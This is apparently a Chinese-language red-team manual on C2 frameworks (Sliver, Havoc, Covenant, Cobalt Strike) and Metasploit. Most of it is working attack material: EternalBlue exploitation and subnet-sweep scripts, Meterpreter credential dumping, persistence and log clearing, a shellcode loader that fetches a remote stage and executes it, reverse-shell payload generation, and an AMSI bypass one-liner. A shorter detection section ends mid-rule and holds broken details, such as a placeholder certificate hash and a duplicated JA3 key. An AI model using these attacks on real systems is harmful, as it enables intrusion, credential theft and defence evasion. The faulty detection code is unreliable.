---
name: c2-infrastructure
description: >
  Complete manual for C2 infrastructure and exploitation frameworks. Covers Sliver, Havoc, Covenant C2 deployment and operations;
  Cobalt Strike beacon configuration analysis and malleable profile reverse engineering; Metasploit Framework exploitation methodology;
  and vulnerability exploitation case studies (EternalBlue). Full C2 attack operations and defense (beacon detection, traffic analysis, C2 hunting).
domain: cybersecurity
subdomain: offensive-security
tags: [c2, sliver, havoc, covenant, cobalt-strike, metasploit, eternalblue, beacon, malleable-profile, exploitation, red-team]
version: 2.0.0
---

# C2 基础设施与漏洞利用框架 — 完整攻防手册

## 适用场景

- 部署和运营红队 C2 基础设施（Sliver/Havoc/Covenant）
- 分析 Cobalt Strike beacon 配置与 malleable profile
- 使用 Metasploit Framework 进行漏洞利用
- 检测和狩猎网络中的 C2 通信（beacon、DNS tunneling、HTTPS C2）
- EternalBlue 等高危漏洞的利用与防御

**不适用场景**：初始访问（钓鱼/社工）— 参见 `phishing-operations`；后渗透横向移动 — 参见 `lateral-movement`；恶意软件静态分析 — 参见 `malware-analysis`。

## 前置条件

- 网络协议基础（TCP/HTTP/DNS/SMB）
- Windows/Linux 系统管理经验
- 基础渗透测试知识
- Go/Python 编程基础（用于自定义 implant 和脚本）

---

## Part A：攻击方法论

### 1. 识别与探测

#### 1.1 目标环境侦察与 C2 选型

```bash
# 1. 出口流量分析 — 判断可用 C2 通道
# 检查允许的出站端口
nmap -sT -p 80,443,8080,8443,53 --open scanme.nmap.org

# 检查 DNS 解析能力
nslookup google.com
dig +short google.com @8.8.8.8

# 检查 HTTPS 出站（含证书检查）
curl -vk https://api.github.com/ 2>&1 | grep -E "SSL|subject|issuer"

# 2. 防御产品识别
# EDR/AV 检测
wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState
# 或 PowerShell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select displayName

# 3. 根据环境选择 C2 框架
```

#### 1.2 C2 框架选型矩阵

| 框架 | 语言 | 优势 | 适用场景 | 隐蔽性 | 维护状态 |
|------|------|------|----------|--------|----------|
| Sliver | Go | 跨平台、活跃社区、扩展器生态 | 通用红队 | 中-高 | 活跃 |
| Havoc | C/C++ | 高隐蔽 demon agent、模块化 | 高对抗环境 | 高 | 活跃 |
| Covenant | C# | .NET 生态集成、grunts | Windows 域渗透 | 中 | 维护模式 |
| Cobalt Strike | Java | 成熟生态、malleable profile | 企业红队 | 高（需配置） | 商业 |
| Metasploit | Ruby | 漏洞利用库庞大、模块化 | 初始利用+后渗透 | 低-中 | 活跃 |

### 2. 利用与攻击

#### 2.1 Sliver C2 部署与操作

```bash
# === 服务端部署 ===

# 安装 Sliver
curl https://sliver.sh/install|sudo bash

# 启动服务端（多操作员模式）
sliver-server daemon --lport 31337

# === 操作员配置 ===

# 在操作员机器上安装客户端
curl https://sliver.sh/install|sudo bash

# 导入操作员配置（从服务端生成）
# 服务端执行:
sliver-server operator --name operator1 --lhost <SERVER_IP> --save /tmp/operator1.cfg

# 操作员导入:
mkdir -p ~/.sliver-client
cp /tmp/operator1.cfg ~/.sliver-client/default.cfg

# 启动客户端
sliver

# === Implant 生成 ===

# 生成 HTTP beacon
sliver > generate --http <DOMAIN>.com --os windows --arch amd64 --save /tmp/

# 生成 DNS beacon
sliver > generate --dns <DOMAIN>.com --os windows --arch amd64 --save /tmp/

# 生成 mTLS implant（点对点加密隧道）
sliver > generate --mtls <SERVER_IP>:8888 --os windows --arch amd64 --save /tmp/

# 生成分阶段 payload（更小体积）
sliver > generate --http <DOMAIN>.com --os windows --arch amd64 --save /tmp/ --format shellcode

# 生成 Linux implant
sliver > generate --http <DOMAIN>.com --os linux --arch amd64 --save /tmp/

# === 监听器管理 ===

# 启动 HTTP 监听
sliver > http -l 8080 -d <DOMAIN>.com

# 启动 DNS 监听
sliver > dns -d <DOMAIN>.com

# 启动 mTLS 监听
sliver > mtls -l 8888

# === 会话操作 ===

# 查看活跃会话
sliver > sessions

# 进入会话
sliver > use <SESSION_ID>

# 会话内命令
sliver (SESSION) > info                   # 目标信息
sliver (SESSION) > sysinfo                # 系统信息
sliver (SESSION) > whoami                 # 当前用户
sliver (SESSION) > getuid                 # 用户 ID
sliver (SESSION) > ps                     # 进程列表
sliver (SESSION) > netstat                # 网络连接
sliver (SESSION) > ifconfig               # 网络接口

# 文件操作
sliver (SESSION) > ls C:\\Users
sliver (SESSION) > download C:\\Users\\target\\secrets.txt
sliver (SESSION) > upload /local/payload.exe C:\\temp\\payload.exe
sliver (SESSION) > cd C:\\temp
sliver (SESSION) > pwd

# 执行
sliver (SESSION) > execute -o C:\\Windows\\System32\\whoami.exe
sliver (SESSION) > shell                  # 交互式 shell

# 权限提升
sliver (SESSION) > getsystem
sliver (SESSION) > rev2self

# 凭证获取
sliver (SESSION) > dumpcreds              # 导出凭证
sliver (SESSION) > mimikatz               # 内置 mimikatz

# 横向移动
sliver (SESSION) > pivots add tcp <PIVOT_IP>:<PORT>  # TCP pivot
sliver (SESSION) > pivots list

# === 扩展器（Armory）===

# 搜索可用扩展
sliver > armory search

# 安装扩展
sliver > armory install rubeus
sliver > armory install seatbelt
sliver > armory install sharphound

# 使用扩展
sliver (SESSION) > rubeus kerberoast
sliver (SESSION) > seatbelt -group=all
```

#### 2.2 Havoc C2 部署与操作

```bash
# === 服务端部署 ===

# 安装依赖
sudo apt install -y build-essential cmake gcc-mingw-w64-x86-64

# 编译 Havoc 服务端
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc/teamserver
make

# 配置 teamserver（havoc.yml）
cat > havoc.yml << 'EOF'
teamserver:
  host: "0.0.0.0"
  port: 40056
  path: "ws"
  password: "<STRONG_PASSWORD>"

service:
  endpoint: "0.0.0.0"
  port: 8443

logging:
  enabled: true
  directory: "/opt/havoc/logs"

modules:
  - name: "Demon"
    description: "Default Havoc agent"
    author: "Havoc"
    version: "1.0"
EOF

# 启动 teamserver
./teamserver --config havoc.yml --verbose

# === 客户端连接 ===

# 编译客户端
cd Havoc/client
make

# 启动客户端并连接
./havoc

# 在 GUI 中配置:
# Teamserver Host: <SERVER_IP>
# Teamserver Port: 40056
# Password: <STRONG_PASSWORD>

# === Demon Agent 生成 ===

# 通过 GUI 生成:
# 1. Attacks -> Generate Agent
# 2. 选择 Demon agent
# 3. 配置:
#    - Listener: <已创建的HTTPS监听器>
#    - Format: Windows Exe / Shellcode / DLL
#    - Arch: x64
#    - Sleep: 30s
#    - Jitter: 25%
#    - Kill Date: <设定过期时间>

# 通过命令行生成 demon:
cd Havoc/agent
make Windows/X64/Release

# === 监听器配置 ===

# HTTPS 监听器（通过 GUI）:
# 1. View -> Listeners -> Add
# 2. 类型: HTTPS
# 3. Host: <DOMAIN>.com
# 4. Port: 443
# 5. SSL: 使用 Let's Encrypt 证书

# === Demon 会话操作 ===

# 基础命令
Demon > whoami
Demon > sysinfo
Demon > ps
Demon > shell whoami /all

# 内存执行 .NET 程序集
Demon > inline-execute <ASSEMBLY_PATH> <ARGS>

# 反射式 DLL 注入
Demon > dllinject <PID> <DLL_PATH>

# Token 操作
Demon > steal_token <PID>
Demon > make_token <DOMAIN>\<USER> <PASSWORD>
Demon > rev2self

# 横向移动
Demon > jump psexec <TARGET> <LISTENER>
Demon > jump wmi <TARGET> <LISTENER>
```

#### 2.3 Covenant C2 操作

```powershell
# === 部署（Docker 方式）===

# 克隆并构建
git clone --recursive https://github.com/cobbr/Covenant.git
cd Covenant/Covenant
docker build -t covenant .

# 启动
docker run -it -p 7443:7443 -p 80:80 -p 443:443 \
  --name covenant covenant

# 访问 Web UI: https://<SERVER_IP>:7443/covenantuser
# 首次访问创建管理员账户

# === Listener 配置 ===

# 1. 导航到 Listeners -> Create
# 2. 选择 HTTP Listener
# 3. 配置:
#    Name: http-listener
#    BindAddress: 0.0.0.0
#    BindPort: 80
#    ConnectPort: 80
#    ConnectAddress: <DOMAIN_OR_IP>
#    UseSSL: false (前端 Nginx 处理 SSL)

# === Launcher 生成 ===

# 1. 导航到 Launchers -> Create
# 2. 选择类型:
#    - Binary: 独立 EXE
#    - PowerShell: ps1 脚本
#    - ShellCode: 原始 shellcode
#    - InstallUtil: 使用 InstallUtil.exe 执行
#    - MSBuild: 使用 MSBuild.exe 执行
# 3. 配置参数:
#    - Listener: http-listener
#    - Jitter: 25%
#    - ConnectAttempts: 10
#    - Delay: 30s

# === Grunt 操作 ===

# 激活的 Grunt 交互
Grunt (HTTP) > whoami
Grunt (HTTP) > Shell whoami /all
Grunt (HTTP) > Shell net group "Domain Admins" /domain

# .NET 内联执行
Grunt (HTTP) > InlineExecution <ASSEMBLY> <PARAMS>

# 凭证获取
Grunt (HTTP) > Mimikatz

# 上传/下载
Grunt (HTTP) > Upload <LOCAL_PATH> <REMOTE_PATH>
Grunt (HTTP) > Download <REMOTE_PATH>

# 横向移动
Grunt (HTTP) > WmiExec <TARGET> <COMMAND> <DOMAIN>\<USER> <PASSWORD>
Grunt (HTTP) > DcomExec <TARGET> <COMMAND> <DOMAIN>\<USER> <PASSWORD>
```

#### 2.4 Cobalt Strike Beacon 配置分析

```python
#!/usr/bin/env python3
"""Cobalt Strike beacon 配置提取与分析"""
import struct, json, sys
from base64 import b64decode

def extract_beacon_config(data):
    """从 beacon payload 中提取配置"""
    # Cobalt Strike beacon 配置以 0x0000 0x0001 开头
    # 每个设置格式: Setting_ID (2 bytes) + Type (2 bytes) + Length (2 bytes) + Value

    results = {}
    config_start = data.find(bytes.fromhex('00000100'))  # Setting 1, type 0 (short)
    if config_start == -1:
        config_start = data.find(bytes.fromhex('00000101'))  # Setting 1, type 1

    if config_start == -1:
        return {"error": "No beacon config found"}

    # 已知设置 ID 映射
    SETTING_MAP = {
        1: "BEACON_PORT", 2: "SLEEPTIME", 3: "MAXSIZE",
        4: "JITTER", 5: "PUBLICKEY", 6: "C2_SERVER",
        7: "USERAGENT", 8: "POST_URI", 9: "DNS_RESOLVE",
        10: "PUBKEY_PREFIX", 14: "COOKIES",
        22: "HTTP_GET_VERB", 23: "HTTP_GET_URL",
        24: "HTTP_POST_VERB", 25: "HTTP_POST_URL",
        26: "MALLEABLE_C2_HEADERS_GET", 27: "MALLEABLE_C2_HEADERS_POST",
        29: "SPAWNTO", 31: "PROXY_TYPE",
        32: "PROXY_HOST", 33: "PROXY_USER", 34: "PROXY_PASS",
        37: "WATERMARK", 38: "CLEANUP",
        39: "CFG_CAUTION", 40: "KILL_DATE",
        41: "HTTP_POST_CHUNK", 42: "GARGLE_NOOK",
        43: "PROCINJ_PERMS_I", 44: "PROCINJ_PERMS",
        45: "PROCINJ_MINALLOC", 46: "PROCINJ_STUB",
        50: "PROCINJ_WAYPOINTS", 51: "PROCINJ_SPOOFADDR",
        52: "HTTP_NO_HEADER", 53: "PROCINJ_PROCINJ",
        54: "PROXY_BEHAVIOR", 55: "WATERMARK_HASH",
        56: "CRON_NAME", 57: "USES_COOKIE",
        58: "TEXT_SECTION_PAD", 59: "PROCESS_FILE",
        60: "PROXY_BEHAVIOR_STR",
    }

    TYPE_MAP = {0: "SHORT", 1: "INT", 2: "PTR", 3: "STRING"}

    pos = config_start
    while pos < len(data) - 6:
        setting_id = struct.unpack('>H', data[pos:pos+2])[0]
        setting_type = struct.unpack('>H', data[pos+2:pos+4])[0]
        length = struct.unpack('>H', data[pos+4:pos+6])[0]

        if setting_id == 0 and setting_type == 0:
            break  # 配置结束标记

        name = SETTING_MAP.get(setting_id, f"UNKNOWN_{setting_id}")
        tname = TYPE_MAP.get(setting_type, f"TYPE_{setting_type}")

        try:
            raw = data[pos+6:pos+6+length]
            if setting_type in (0, 1):  # 数值类型
                if length == 2:
                    value = struct.unpack('>H', raw)[0]
                elif length == 4:
                    value = struct.unpack('>I', raw)[0]
                else:
                    value = raw.hex()
            else:  # 字符串/二进制
                try:
                    value = raw.decode('utf-8', errors='replace').rstrip('\x00')
                except:
                    value = raw.hex()
        except:
            value = "PARSE_ERROR"

        results[name] = {"id": setting_id, "type": tname, "value": value}
        pos += 6 + length

    return results

def analyze_beacon_x509(cert_data):
    """分析 Cobalt Strike 默认证书特征"""
    # CS 默认证书的特征
    cs_indicators = {
        "issuer_cn": ["Cobalt Strike", "Team Server", "Post-Quantum"],
        "subject_cn": ["Major Cobalt", "Cobalt Strike", "Team Server"],
        "serial_patterns": ["0000000000000000"],
    }
    findings = []
    for indicator, values in cs_indicators.items():
        for v in values:
            if v.lower() in str(cert_data).lower():
                findings.append(f"[MATCH] {indicator}: {v}")
    return findings

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <beacon_payload>")
        sys.exit(1)
    with open(sys.argv[1], 'rb') as f:
        data = f.read()
    config = extract_beacon_config(data)
    print(json.dumps(config, indent=2, ensure_ascii=False))
```

#### 2.5 Cobalt Strike Malleable C2 Profile 分析

```
# === 示例 Malleable Profile（模拟合法流量）===

# amazon.profile — 伪装为 Amazon CDN 流量
set sleeptime "30000";         # 30秒心跳
set jitter "25";               # 25% 抖动
set maxdns "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

https-certificate {
    set keystore "keystore.jks";
    set password "changeit";
}

http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-2618437/field-keywords=books";

    client {
        header "Accept" "*/*";
        header "Host" "www.amazon.com";
        header "Referer" "https://www.amazon.com/";
        header "Accept-Language" "en-US,en;q=0.9";

        metadata {
            base64url;
            prepend "session-token=";
            prepend "ubid-main=";
            append ";x-main=";
            print;
        }
    }

    server {
        header "Server" "Server";
        header "x-amz-rid" "0RV2MFCYNQVY2A5VACXP";
        header "Set-Cookie" "lc-main=1;";
        header "Content-Type" "text/html;charset=UTF-8";

        output {
            print;
        }
    }
}

http-post {
    set uri "/gp/yourstore/home";

    client {
        header "Accept" "*/*";
        header "Host" "www.amazon.com";
        header "Referer" "https://www.amazon.com/";
        header "Content-Type" "application/x-www-form-urlencoded";

        id {
            parameter "field-keywords";
        }

        output {
            base64;
            print;
        }
    }

    server {
        header "Server" "Server";
        header "Content-Type" "text/html;charset=UTF-8";

        output {
            print;
        }
    }
}

# 进程注入配置
process-inject {
    set spawnto "x86 -> %windir%\\syswow64\\rundll32.exe";
    set spawnto "x64 -> %windir%\\sysnative\\rundll32.exe";

    set startrunner "x86 -> %windir%\\syswow64\\svchost.exe";
    set startrunner "x64 -> %windir%\\sysnative\\svchost.exe";

    injector {
        set x86 "CreateRemoteThread";
        set x64 "CreateRemoteThread";
    }
}

# 后渗透配置
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\werfault.exe";
    set spawnto_x64 "%windir%\\sysnative\\werfault.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipeb "both";
    set keylogger "GetAsyncKeyState";
}
```

```python
#!/usr/bin/env python3
"""Malleable Profile 静态分析 — 提取 IOCs 和特征"""

def analyze_malleable_profile(profile_text):
    """解析 malleable profile 提取检测特征"""
    indicators = {
        "uri_patterns": [],
        "headers": [],
        "transforms": [],
        "settings": {},
        "ioc": [],
    }

    lines = profile_text.split('\n')
    for line in lines:
        line = line.strip().rstrip(';')

        # 提取关键设置
        if line.startswith('set '):
            parts = line.split(None, 2)
            if len(parts) >= 3:
                key, val = parts[1], parts[2].strip('"')
                indicators["settings"][key] = val

        # 提取 URI
        if 'set uri' in line:
            uri = line.split('"')[1] if '"' in line else ""
            if uri:
                indicators["uri_patterns"].append(uri)

        # 提取 header
        if 'header "' in line:
            header_parts = line.split('"')
            if len(header_parts) >= 4:
                indicators["headers"].append(f"{header_parts[1]}: {header_parts[3]}")

        # 提取数据转换
        for transform in ['base64', 'base64url', 'mask', 'netbios', 'netbiosu',
                          'prepend', 'append', 'print', 'strrep']:
            if transform in line.lower() and not line.strip().startswith('#'):
                indicators["transforms"].append(line.strip())

    # 生成 IOC
    for uri in indicators["uri_patterns"]:
        indicators["ioc"].append(f"HTTP URI: {uri}")
    for header in indicators["headers"]:
        indicators["ioc"].append(f"HTTP Header: {header}")

    return indicators

if __name__ == '__main__':
    import sys, json
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <profile_file>")
        sys.exit(1)
    with open(sys.argv[1]) as f:
        profile = f.read()
    result = analyze_malleable_profile(profile)
    print(json.dumps(result, indent=2))
```

#### 2.6 Metasploit Framework 漏洞利用

```bash
# === 基础操作 ===

# 启动 msfconsole
msfconsole -q

# 搜索模块
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2017-0144
msf6 > search name:eternalblue
msf6 > search auxiliary scanner smb

# 模块选择与配置
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RPORT 445
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST <ATTACKER_IP>
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_https

# 检查目标是否脆弱
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

# 执行利用
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

# === Meterpreter 后渗透 ===

# 基础信息收集
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ipconfig
meterpreter > route
meterpreter > arp

# 提权
meterpreter > getsystem
meterpreter > getprivs

# 凭证获取
meterpreter > load kiwi              # 加载 Mimikatz
meterpreter > creds_all              # 获取所有凭证
meterpreter > creds_wdigest
meterpreter > creds_msv
meterpreter > kerberos_ticket_list
meterpreter > hashdump               # SAM 数据库哈希

# 文件操作
meterpreter > ls
meterpreter > cd C:\\Users
meterpreter > download secret.txt
meterpreter > upload payload.exe C:\\temp\\
meterpreter > cat C:\\Windows\\temp\\log.txt

# 网络操作
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.200  # RDP 转发
meterpreter > portfwd list
meterpreter > route add 10.0.0.0 255.255.255.0 1            # 路由添加
meterpreter > run autoroute -s 10.0.0.0/24

# 信息收集脚本
meterpreter > run winenum              # Windows 枚举
meterpreter > run post/multi/gather/ssh_creds
meterpreter > run post/windows/gather/enum_services

# 持久化
meterpreter > run persistence -U -i 30 -p 4444 -r <ATTACKER_IP>
meterpreter > run scheduleme -m 1 -c "powershell -ep bypass -f update.ps1"

# 清理
meterpreter > clearev                  # 清除事件日志
meterpreter > timestomp file.txt -v    # 时间戳操作

# === Meterpreter Payload 类型 ===

# 反向 HTTPS（推荐 — 加密+穿透防火墙）
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <DOMAIN>.com
set LPORT 443

# 反向 TCP（基础 — 明文）
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444

# 反向 HTTP
set PAYLOAD windows/x64/meterpreter/reverse_http
set LHOST <DOMAIN>.com
set LPORT 80

# 分阶段 vs 无阶段
# 分阶段（小体积，两步传输）:
set PAYLOAD windows/x64/meterpreter/reverse_https

# 无阶段（大体积，单文件）:
set PAYLOAD windows/x64/meterpreter/reverse_https_rc4
set RC4PASSWORD "mysecretkey"

# === 资源脚本自动化 ===

# eternalblue_auto.rc
cat > eternalblue_auto.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.0/24
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <ATTACKER_IP>
set LPORT 443
set ExitOnSession false
set THREADS 10
exploit -j
EOF

# 执行资源脚本
msfconsole -r eternalblue_auto.rc -q

# === 常用辅助模块 ===

# SMB 扫描
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# EternalBlue 漏洞检测
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# 空会话枚举
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# 密码喷洒
use auxiliary/analyze/crack_windows
```

#### 2.7 EternalBlue (MS17-010) 深度利用

```bash
# === 漏洞概述 ===
# CVE: CVE-2017-0144
# 影响: Windows SMBv1 (Win7/2008R2 及更早)
# 类型: 远程代码执行
# 协议: SMB (TCP 445)
# 需求: 目标开放 445 端口 + 运行 SMBv1

# === 步骤 1: 目标发现 ===

# 扫描 SMB 主机
nmap -p 445 --open -sV 192.168.1.0/24

# 专用 EternalBlue 漏洞扫描
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.0/24

# Metasploit 检测
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.1.0/24; run; exit"

# === 步骤 2: 利用 ===

# 方法 1: Metasploit 标准利用
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT 443
msf6 > exploit

# 方法 2: EternalBlue + DoublePulsar (传统)
# 注意: 使用原版 NSA 工具风险较高，蓝屏概率大
# 推荐使用 Metasploit 改进版本

# 方法 3: 自动化批量利用
cat > eternal_sweep.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <ATTACKER_IP>
set LPORT 443
set ExitOnSession false
set THREADS 5
set RHOSTS file:/tmp/targets.txt
exploit -j
EOF
msfconsole -r eternal_sweep.rc -q

# === 步骤 3: DoublePulsar 检测 ===

# 检测是否已植入 DoublePulsar 后门
use auxiliary/scanner/smb/smb_doublepulsar_overlay
set RHOSTS 192.168.1.0/24
run

# Python 检测脚本
python3 -c "
import socket, struct
def check_doublepulsar(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((ip, 445))
        # 发送 SMB negotiate 包
        negotiate = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00'
        negotiate += b'\x18\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        negotiate += b'\x00\x00\xfe\xff\x00\x00\x00\x00' + b'\x00' * 63
        negotiate += b'\x00\x31' + b'\x00' * 17
        sock.send(negotiate)
        resp = sock.recv(4096)
        # 检查 DoublePulsar 特征
        if len(resp) > 72:
            key = struct.unpack('<H', resp[70:72])[0]
            if key == 0x0031:  # DoublePulsar 签名
                print(f'[INFECTED] {ip} - DoublePulsar detected')
                return True
        print(f'[CLEAN] {ip}')
        return False
    except Exception as e:
        print(f'[ERROR] {ip}: {e}')
        return False
    finally:
        sock.close()

# 批量检测
for ip in open('/tmp/targets.txt'):
    check_doublepulsar(ip.strip())
"
```

### 3. 工具使用

#### 3.1 工具速查

| 工具 | 命令 | 功能 |
|------|------|------|
| Sliver | `sliver` | 启动客户端 |
| Sliver | `generate --http <DOMAIN>` | 生成 HTTP implant |
| Sliver | `http -l 8080` | 启动 HTTP 监听 |
| Sliver | `armory install <name>` | 安装扩展模块 |
| Havoc | `./teamserver --config yml` | 启动 teamserver |
| Covenant | `docker run -p 7443:7443 covenant` | Docker 启动 |
| CS Beacon | `beacon-config-parser.py` | 解析配置 |
| msfconsole | `msfconsole -q` | 启动 |
| msfconsole | `search <keyword>` | 搜索模块 |
| msfconsole | `use <module>` | 选择模块 |
| msfconsole | `set RHOSTS <IP>` | 设置目标 |
| msfconsole | `exploit -j` | 后台利用 |

### 4. 绕过技术

#### 4.1 C2 流量伪装

```bash
# 1. 域前置 (Domain Fronting)
# 使用 CDN 域名伪装真实 C2 域名
# Sliver:
sliver > generate --http fronted.cdn.com --lport 443 \
  --headers "Host:actual-c2.com" \
  --save /tmp/

# 2. DNS over HTTPS C2
# 使用 DoH 提供商作为 C2 通道
# 在 malleable profile 中:
# http-get { set uri "/dns-query?name=beacon.dns.c2.com&type=A"; }

# 3. CDN 覆盖（CloudFlare Workers）
# 部署 CloudFlare Worker 作为 C2 中转
cat > worker.js << 'EOF'
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  // 转发到真实 C2
  const targetUrl = 'https://actual-c2.com' + url.pathname
  const resp = await fetch(targetUrl, {
    method: request.method,
    headers: request.headers,
    body: request.body
  })
  return new Response(resp.body, {
    status: resp.status,
    headers: resp.headers
  })
}
EOF

# 4. HTTPS 证书伪装
# 使用 Let's Encrypt 获取合法证书
certbot certonly --standalone -d c2.legitdomain.com

# 5. 流量时间混淆
# Beacon sleep + jitter 配置
# Sliver:
sliver > generate --http c2.com --jitter 30 --delay 60
# CS: set sleeptime "60000"; set jitter "35";
```

#### 4.2 Payload 规避

```bash
# 1. Shellcode 混淆
# 使用 msfvenom 生成编码 payload
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<DOMAIN> LPORT=443 \
  -e x64/xor_dynamic -i 3 \
  -f raw -o payload.bin

# 2. 分阶段加载
# Stage 1: 小型加载器
cat > loader.c << 'EOF'
#include <windows.h>
#include <stdio.h>
int main() {
    // 从远程获取 stage2 shellcode
    HINTERNET hInternet = InternetOpen("Mozilla/5.0", 0, NULL, NULL, 0);
    HINTERNET hConnect = InternetOpenUrl(hInternet,
        "https://cdn.example.com/img/logo.png", NULL, 0, 0, 0);
    DWORD bytesRead;
    char buf[4096];
    InternetReadFile(hConnect, buf, sizeof(buf), &bytesRead);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // 执行 shellcode
    void *exec = VirtualAlloc(0, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, bytesRead);
    ((void(*)())exec)();
    return 0;
}
EOF
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lwininet

# 3. 进程注入（避免磁盘写入）
# 使用合法进程（rundll32/svchost）注入
meterpreter > migrate <PID>
meterpreter > ps | grep explorer
meterpreter > migrate <EXPLORER_PID>

# 4. AMSI 绕过
# PowerShell AMSI bypass
powershell -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 Cobalt Strike Teamserver 检测

```python
#!/usr/bin/env python3
"""Cobalt Strike teamserver 指纹检测"""
import socket, ssl, hashlib

def detect_cs_teamserver(ip, port=50050):
    """检测 Cobalt Strike teamserver 默认端口"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ssock = ctx.wrap_socket(sock, server_hostname=ip)
        ssock.connect((ip, port))

        # CS 默认证书指纹
        cert = ssock.getpeercert(binary_form=True)
        cert_hash = hashlib.sha256(cert).hexdigest()

        known_cs_hashes = {
            "87f0e0e9b717b5e8e9d7c0f5e7e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0": "CS 4.x Default",
        }

        if cert_hash in known_cs_hashes:
            return {"detected": True, "type": known_cs_hashes[cert_hash], "hash": cert_hash}

        # 检查默认 CN
        cert_der = ssl.DER_cert_to_PEM_cert(cert)
        if 'Cobalt' in cert_der or 'Team Server' in cert_der:
            return {"detected": True, "type": "CS Default Certificate", "hash": cert_hash}

        return {"detected": False, "hash": cert_hash}
    except Exception as e:
        return {"error": str(e)}
    finally:
        sock.close()

def detect_cs_ja3(ja3_hash):
    """通过 JA3 指纹检测 Cobalt Strike"""
    cs_ja3_hashes = {
        "72a589da586844d7f0818ce684948eea": "Cobalt Strike Beacon (default)",
        "a0e9f5d64349fb13191bc781f81f42e1": "Cobalt Strike Java",
        "a0e9f5d64349fb13191bc781f81f42e1": "Cobalt Strike Teamserver",
    }
    return cs_ja3_hashes.get(ja3_hash, None)
```

#### 5.2 Beacon Jitter 检测（统计方法）

```python
#!/usr/bin/env python3
"""Beacon jitter 检测 — 分析 HTTP 请求时间间隔"""
import numpy as np
from collections import Counter

def detect_beacon_pattern(timestamps, threshold=0.3):
    """
    检测 beacon 心跳模式
    timestamps: HTTP 请求时间戳列表 (float)
    """
    if len(timestamps) < 10:
        return {"detected": False, "reason": "Insufficient data"}

    # 计算间隔
    intervals = np.diff(sorted(timestamps))

    # 统计分析
    mean_interval = np.mean(intervals)
    std_interval = np.std(intervals)
    cv = std_interval / mean_interval if mean_interval > 0 else 0  # 变异系数

    # Beacon 特征:
    # - 低变异系数 (CV < 0.3) = 规律性高
    # - 但有一些抖动 (CS 默认 jitter 为 0-37%)
    result = {
        "total_requests": len(timestamps),
        "mean_interval": round(mean_interval, 2),
        "std_interval": round(std_interval, 2),
        "cv": round(cv, 4),
        "detection": None,
    }

    # 1. 完美规律性（无 jitter）— 高度可疑
    if cv < 0.05:
        result["detection"] = "HIGH - No jitter (perfectly periodic)"
        result["detected"] = True

    # 2. 低抖动（CS 默认 jitter 范围）— 可疑
    elif cv < threshold:
        result["detection"] = "MEDIUM - Low jitter beacon pattern"
        result["detected"] = True

    # 3. 检查固定间隔模式
    interval_counts = Counter(round(intervals, 0))
    most_common = interval_counts.most_common(3)
    total = len(intervals)

    for interval_val, count in most_common:
        if count / total > 0.4:  # 超过 40% 的请求在同一间隔
            result["dominant_interval"] = f"{interval_val}s ({count}/{total})"
            result["detected"] = True
            result["detection"] = f"MEDIUM - Dominant interval {interval_val}s"
            break

    return result
```

#### 5.3 Sigma 检测规则

```yaml
# Cobalt Strike Beacon 进程创建
title: Cobalt Strike Beacon Spawned Process
